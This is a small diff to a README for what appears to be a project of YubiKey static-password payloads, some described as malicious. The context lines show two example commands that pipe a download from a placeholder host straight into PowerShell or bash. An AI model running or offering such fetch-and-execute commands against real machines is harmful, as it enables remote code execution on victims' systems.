@@ -4,7 +4,7 @@ malicious and non-malicious payloads for yubikeys!
 
 ## Concept
 The concept is simple - you set a static password as a command, such as:
-```txt
+```
 curl -L malicous.example.com | pwsh                    (Windows)
 curl -L malicous.example.com | bash                    ( Linux )
 ```
